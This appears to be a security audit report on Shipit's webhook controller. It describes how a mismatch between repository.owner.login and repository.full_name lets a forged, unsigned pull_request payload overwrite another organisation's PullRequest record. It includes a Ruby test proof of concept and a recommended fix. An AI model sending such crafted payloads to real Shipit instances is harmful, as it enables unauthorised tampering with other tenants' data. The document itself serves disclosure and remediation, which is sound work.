### Title
`repository.owner.login` selects the webhook-signing secret while `repository.full_name` selects the mutated stack, letting an attacker with a no-secret org's payload write into another org's `PullRequest` record - (File: app/controllers/shipit/webhooks_controller.rb, app/models/shipit/webhooks/handlers/pull_request/assigned_handler.rb)

### Summary
`Shipit::WebhooksController#verify_signature` picks the `GitHubApp` (and therefore the secret used to verify `X-Hub-Signature`) exclusively from `params.dig('repository','owner','login')`, but `AssignedHandler#repository` resolves the mutated `Shipit::Repository`/`Stack` exclusively from `params.repository.full_name`. Nothing enforces that these two fields refer to the same repository, so a payload whose `repository.owner.login` names an org with no `webhook_secret` configured passes signature verification trivially while `repository.full_name` can point at a completely different, victim-owned repository whose `PullRequest` record gets updated.

### Finding Description
The broken binding: the code implicitly assumes `params.dig('repository','owner','login') == params.repository.full_name.split('/').first`, but nothing checks this equality.

- `verify_signature` in `app/controllers/shipit/webhooks_controller.rb:24-49` computes `repository_owner` via `params.dig('repository', 'owner', 'login')` (line 61) and calls `Shipit.github(organization: repository_owner).verify_webhook_signature(...)`.
- `GitHubApp#verify_webhook_signature` (`lib/shipit/github_app.rb:76-83`) does `return true unless webhook_secret` — i.e., if the org resolved from `repository.owner.login` has no configured `webhook_secret`, **any** signature (or none) is accepted.
- `AssignedHandler#repository` (`app/models/shipit/webhooks/handlers/pull_request/assigned_handler.rb:67-69`) resolves the actual repository to act on using `Shipit::Repository.from_github_repo_name(params.repository.full_name)`, a completely separate field from the one used for signature selection.
- `AssignedHandler#pull_request` (lines 53-65) then looks up the `Shipit::PullRequest` joined to that resolved repository's stack, and `#process` (lines 41-45) calls `pull_request.update(github_pull_request: params.pull_request)`, which (per `Shipit::PullRequest#github_pull_request=`, `app/models/shipit/pull_request.rb:36-50`) overwrites `title`, `state`, `additions`, `deletions`, `user`, `assignees`, `labels`, and `head` (via `find_or_create_commit_from_github_by_sha!`, which calls the victim stack's own `github_api` to fetch a commit).

Exploit flow: attacker crafts a JSON body with `X-Github-Event: pull_request`, `action: assigned`, `repository.owner.login = "no-secret-org"` (an org configured in `Shipit.github_apps` with no `webhook_secret` — confirmed multi-org configs are supported, e.g. `test/dummy/config/secrets_double_github_app.yml`), and `repository.full_name = "victim-org/victim-repo"`, with `number` matching an existing PR in the victim stack. `verify_signature` resolves `Shipit.github(organization: "no-secret-org")`, whose `verify_webhook_signature` unconditionally returns `true`, so the request is accepted. `AssignedHandler` then resolves the repository via `full_name` and updates the victim's `PullRequest` row.

Existing guards do not catch this: `drop_unhandled_event` only checks the event type exists; `verify_signature` never cross-checks `repository.full_name`'s owner against `repository_owner`; `ExplicitParameters` schema only validates types/presence, not cross-field consistency; `Repository#from_github_repo_name` performs an unrelated DB lookup keyed on `full_name` alone (`app/models/shipit/repository.rb:53-56`).

### Impact Explanation
An unauthenticated/unprivileged attacker who controls (or names) any org with no configured `webhook_secret` can write attacker-chosen `title`, `state`, `assignees`, `labels`, and `head` commit data into a `Shipit::PullRequest` record belonging to a stack whose owning repository never authenticated the request — this is exactly the "payload for one repository mutating another's stack, commit, or task" case classified as Critical in the rules. This is repeatable against any stack/repo whose PR number is guessable/known, is not limited to a single tenant, and works across arbitrary victim stacks configured in the same Shipit instance. Note: `AssignedHandler` itself does not directly trigger a deploy/merge/rollback (it does not touch `MergeRequest#mergeable` or enqueue deploy jobs), so the "auto-triggered deploy via bot_login" amplification claimed in the question is not directly substantiated by this handler; the demonstrable, in-scope impact is the cross-tenant record mutation itself.

### Likelihood Explanation
Requires a Shipit installation configured with multiple GitHub orgs where at least one has no `webhook_secret` set (a supported, documented configuration per `docs/setup.md`/`lib/shipit.rb` and exercised in `test/dummy/config/secrets_double_github_app.yml`). Given that precondition, the attack costs a single unauthenticated HTTP POST with no secrets, no session, and no GitHub App access, and is fully repeatable against any PR number/stack combination.

### Recommendation
In `Shipit::WebhooksController#verify_signature`, derive the authorizing organization strictly, and in every `pull_request`/`issue`/similar handler, verify that the owner segment of `params.repository.full_name` matches `repository_owner` (or better, verify the signature using the secret for the org derived from `full_name`, not `owner.login`), rejecting the request (422) on mismatch before any handler runs.

### Proof of Concept
```ruby
test "pull_request assigned payload with mismatched owner/full_name mutates a different stack's PR" do
  # victim stack belongs to org "victim-org", secret configured
  victim_repo = shipit_repositories(:shipit) # owner: "shopify" in fixtures, adapt to victim
  victim_pr = shipit_pull_requests(:some_pr) # existing PR#, tied to victim_repo's stack

  # attacker-controlled org with NO webhook_secret configured
  no_secret_org = "attacker-org"
  Shipit.github_apps[no_secret_org] = Shipit::GitHubApp.new(no_secret_org, { app_id: 1, installation_id: 1, private_key: nil }) # no webhook_secret

  request.headers['X-Github-Event'] = 'pull_request'
  request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # bogus, irrelevant since no secret configured

  payload = {
    action: 'assigned',
    number: victim_pr.number,
    pull_request: {
      id: 999, number: victim_pr.number, url: 'http://x', title: 'ATTACKER TITLE',
      state: 'open', additions: 1, deletions: 1,
      head: { sha: victim_pr.head.sha, ref: 'attacker-branch' },
      user: { login: 'attacker' },
      assignees: [{ login: 'attacker' }],
      labels: [{ name: 'deploy' }]
    },
    repository: {
      owner: { login: no_secret_org }, # used for signature verification
      full_name: victim_repo.full_name # used to resolve/mutate the actual stack's PR
    },
    sender: { login: 'attacker' }
  }.to_json

  post :create, body: payload, as: :json
  assert_response :ok

  victim_pr.reload
  assert_equal 'ATTACKER TITLE', victim_pr.title # mutated despite never having authenticated with victim's secret
end
```
Assert-before/after: before, `repository_owner ("attacker-org") != victim_repo.owner ("shopify"/"victim-org")` yet the record targeted by `AssignedHandler#repository` (`from_github_repo_name(full_name)`) equals `victim_repo`; after processing, `victim_pr.title` reflects attacker-controlled data, proving the divergence was never checked. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-49)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/assigned_handler.rb (L41-69)
```ruby
          def process
            return unless respond_to_assignee_change?

            pull_request.update(github_pull_request: params.pull_request) if pull_request.present?
          end

          private

          def respond_to_assignee_change?
            %w[assigned unassigned].include?(params.action)
          end

          def pull_request
            @pull_request ||= Shipit::PullRequest
                              .joins(:stack, stack: :repository)
                              .find_by(
                                number: params.number,
                                stacks: {
                                  repositories:
                                    {
                                      id: repository.id
                                    }
                                }
                              )
          end

          def repository
            Shipit::Repository.from_github_repo_name(params.repository.full_name) || Shipit::NullRepository.new
          end
```

**File:** app/models/shipit/pull_request.rb (L36-50)
```ruby
    def github_pull_request=(github_pull_request)
      self.github_id = github_pull_request.id
      self.number = github_pull_request.number
      self.api_url = github_pull_request.url
      self.title = github_pull_request.title
      self.state = github_pull_request.state
      self.additions = github_pull_request.additions
      self.deletions = github_pull_request.deletions
      self.user = User.find_or_create_by_login!(github_pull_request.user.login)
      self.assignees = github_pull_request.assignees.map do |github_user|
        User.find_or_create_by_login!(github_user.login)
      end
      self.labels = github_pull_request.labels.map(&:name)
      self.head = find_or_create_commit_from_github_by_sha!(github_pull_request.head.sha)
    end
```

**File:** app/models/shipit/repository.rb (L53-56)
```ruby
    def self.from_github_repo_name(github_repo_name)
      repo_owner, repo_name = github_repo_name.downcase.split('/')
      find_by(owner: repo_owner, name: repo_name)
    end
```
